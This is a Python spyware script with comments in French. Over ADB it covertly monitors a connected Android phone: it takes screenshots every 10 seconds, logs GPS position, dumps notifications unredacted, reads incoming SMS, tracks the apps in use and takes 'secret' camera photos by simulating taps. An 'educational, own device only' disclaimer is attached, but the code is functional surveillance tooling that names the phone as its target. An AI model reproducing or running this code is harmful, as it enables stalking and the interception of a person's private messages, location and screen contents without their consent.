#!/usr/bin/env python3
"""
🔴 SPYWARE COMPLET - SURVEILLANCE EN TEMPS RÉEL
================================================
Ce script simule un spyware qui surveille continuellement le téléphone:
- Capture d'écran automatique toutes les 10 secondes
- Enregistrement audio
- Suivi GPS
- Interception des notifications
- Keylogger simulation

⚠️ USAGE ÉDUCATIF UNIQUEMENT - SUR TON PROPRE APPAREIL
"""

import subprocess
import os
import time
import threading
from datetime import datetime
import json

# Configuration
ADB = r"C:\Users\davis\AppData\Local\Microsoft\WinGet\Packages\Google.PlatformTools_Microsoft.Winget.Source_8wekyb3d8bbwe\platform-tools\adb.exe"
OUTPUT = r"C:\Users\davis\OneDrive\Bureau\HACKING\SPYWARE_DATA"
RUNNING = True

def adb(cmd):
    try:
        r = subprocess.run(f'"{ADB}" {cmd}', shell=True, capture_output=True, 
                          text=True, timeout=30, encoding='utf-8', errors='replace')
        return r.stdout.strip()
    except:
        return ""

def banner():
    os.system('cls')
    print("""
\033[91m
   ███████╗██████╗ ██╗   ██╗██╗    ██╗ █████╗ ██████╗ ███████╗
   ██╔════╝██╔══██╗╚██╗ ██╔╝██║    ██║██╔══██╗██╔══██╗██╔════╝
   ███████╗██████╔╝ ╚████╔╝ ██║ █╗ ██║███████║██████╔╝█████╗  
   ╚════██║██╔═══╝   ╚██╔╝  ██║███╗██║██╔══██║██╔══██╗██╔══╝  
   ███████║██║        ██║   ╚███╔███╔╝██║  ██║██║  ██║███████╗
   ╚══════╝╚═╝        ╚═╝    ╚══╝╚══╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝
\033[0m
   \033[93m📱 SURVEILLANCE EN TEMPS RÉEL - DEMO ÉDUCATIVE\033[0m
   \033[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\033[0m
    """)

def create_folders():
    folders = ["Screenshots", "Audio", "GPS", "Notifications", "Activity"]
    for f in folders:
        os.makedirs(f"{OUTPUT}/{f}", exist_ok=True)

def screenshot_loop():
    """Capture d'écran automatique"""
    count = 0
    while RUNNING:
        count += 1
        timestamp = datetime.now().strftime("%H%M%S")
        
        adb("shell screencap -p /sdcard/spy.png")
        adb(f'pull /sdcard/spy.png "{OUTPUT}/Screenshots/screen_{timestamp}.png"')
        adb("shell rm /sdcard/spy.png")
        
        print(f"\033[92m   📸 Screenshot #{count} capturé\033[0m")
        time.sleep(10)

def gps_loop():
    """Suivi GPS"""
    while RUNNING:
        timestamp = datetime.now().strftime("%H:%M:%S")
        
        # Obtenir la localisation
        loc = adb("shell dumpsys location | grep -A5 'last location'")
        
        with open(f"{OUTPUT}/GPS/locations.txt", "a", encoding="utf-8") as f:
            f.write(f"\n[{timestamp}]\n{loc}\n")
        
        print(f"\033[94m   📍 Position GPS enregistrée\033[0m")
        time.sleep(30)

def notification_loop():
    """Intercepter les notifications"""
    last_notifs = ""
    while RUNNING:
        notifs = adb("shell dumpsys notification --noredact | head -200")
        
        if notifs != last_notifs:
            timestamp = datetime.now().strftime("%H%M%S")
            with open(f"{OUTPUT}/Notifications/notif_{timestamp}.txt", "w", encoding="utf-8") as f:
                f.write(notifs)
            
            # Chercher les messages importants
            for line in notifs.split("\n"):
                if "android.text=" in line.lower():
                    text = line.split("=")[-1][:50]
                    print(f"\033[95m   🔔 Notification: {text}...\033[0m")
                    break
            
            last_notifs = notifs
        
        time.sleep(5)

def activity_loop():
    """Surveiller l'activité (apps ouvertes)"""
    last_activity = ""
    while RUNNING:
        # App au premier plan
        activity = adb("shell dumpsys activity activities | grep mResumedActivity")
        
        if activity and activity != last_activity:
            timestamp = datetime.now().strftime("%H:%M:%S")
            
            # Extraire le nom de l'app
            if "/" in activity:
                app = activity.split("/")[0].split()[-1]
                print(f"\033[96m   📱 App ouverte: {app}\033[0m")
                
                with open(f"{OUTPUT}/Activity/apps.txt", "a") as f:
                    f.write(f"[{timestamp}] {app}\n")
            
            last_activity = activity
        
        time.sleep(2)

def sms_monitor():
    """Surveiller les nouveaux SMS"""
    last_count = 0
    while RUNNING:
        sms = adb("shell content query --uri content://sms/inbox --sort \"date DESC LIMIT 1\"")
        
        if "Row:" in sms:
            # Extraire le dernier SMS
            for line in sms.split("\n"):
                if "body=" in line:
                    body_start = line.find("body=") + 5
                    body = line[body_start:body_start+50]
                    print(f"\033[93m   💬 SMS reçu: {body}...\033[0m")
                    
                    with open(f"{OUTPUT}/sms_interceptes.txt", "a", encoding="utf-8") as f:
                        f.write(f"[{datetime.now()}] {line}\n")
                    break
        
        time.sleep(10)

def record_audio():
    """Enregistrer l'audio du microphone"""
    print("\033[91m   🎤 Démarrage enregistrement audio (10 secondes)...\033[0m")
    
    # Démarrer l'enregistrement
    adb("shell am start -a android.provider.MediaStore.RECORD_SOUND")
    
    # Note: L'enregistrement via ADB nécessite une app ou root
    # Ceci est une simulation
    
    time.sleep(3)
    print("\033[91m   🎤 (Simulation - nécessite une app spéciale)\033[0m")

def take_photo():
    """Prendre une photo secrète"""
    print("\033[91m   📷 Prise de photo secrète...\033[0m")
    
    # Ouvrir la caméra
    adb("shell am start -a android.media.action.STILL_IMAGE_CAMERA")
    time.sleep(2)
    
    # Simuler un clic pour prendre la photo
    # (coordonnées du bouton de capture)
    adb("shell input tap 540 1900")
    time.sleep(1)
    
    # Capturer l'écran comme preuve
    adb("shell screencap -p /sdcard/camera_spy.png")
    adb(f'pull /sdcard/camera_spy.png "{OUTPUT}/photo_secrete.png"')
    
    # Retour à l'accueil
    adb("shell input keyevent KEYCODE_HOME")
    
    print("\033[92m   📷 Photo capturée!\033[0m")

def display_stats():
    """Afficher les statistiques"""
    while RUNNING:
        time.sleep(15)
        
        # Compter les fichiers
        screenshots = len([f for f in os.listdir(f"{OUTPUT}/Screenshots") if f.endswith('.png')]) if os.path.exists(f"{OUTPUT}/Screenshots") else 0
        
        print(f"""
\033[90m   ════════════════════════════════════════════
   📊 STATS: {screenshots} screenshots | GPS actif | Notifs surveillées
   ════════════════════════════════════════════\033[0m
        """)

def main():
    global RUNNING
    
    banner()
    create_folders()
    
    # Vérifier connexion
    if "device" not in adb("devices"):
        print("\033[91m❌ Téléphone non connecté!\033[0m")
        return
    
    model = adb("shell getprop ro.product.model")
    print(f"\033[92m   ✅ Cible: {model}\033[0m")
    print(f"\033[92m   ✅ Dossier: {OUTPUT}\033[0m")
    print(f"\n\033[93m   ⏳ Démarrage de la surveillance...\033[0m\n")
    
    # Lancer les threads de surveillance
    threads = [
        threading.Thread(target=screenshot_loop, daemon=True),
        threading.Thread(target=gps_loop, daemon=True),
        threading.Thread(target=notification_loop, daemon=True),
        threading.Thread(target=activity_loop, daemon=True),
        threading.Thread(target=display_stats, daemon=True),
    ]
    
    for t in threads:
        t.start()
    
    print("""
\033[91m   ════════════════════════════════════════════════════════════
   🔴 SPYWARE ACTIF - SURVEILLANCE EN COURS
   ════════════════════════════════════════════════════════════
   
   Le spyware capture maintenant:
   • 📸 Screenshots toutes les 10 secondes
   • 📍 Position GPS toutes les 30 secondes
   • 🔔 Notifications en temps réel
   • 📱 Applications utilisées
   
   Appuie sur Entrée pour arrêter...
   ════════════════════════════════════════════════════════════\033[0m
    """)
    
    # Actions spéciales
    print("\n\033[93m   [1] Prendre une photo secrète")
    print("   [2] Ouvrir le dossier des données")
    print("   [0] Arrêter le spyware\033[0m\n")
    
    while True:
        try:
            choice = input("\033[96m   > Commande: \033[0m")
            
            if choice == "1":
                take_photo()
            elif choice == "2":
                os.startfile(OUTPUT)
            elif choice == "0" or choice == "":
                break
        except:
            break
    
    RUNNING = False
    print("\n\033[91m   🛑 Spyware arrêté\033[0m")
    print(f"\033[92m   📂 Données sauvegardées dans: {OUTPUT}\033[0m\n")
    
    # Ouvrir le dossier
    os.startfile(OUTPUT)

if __name__ == "__main__":
    main()
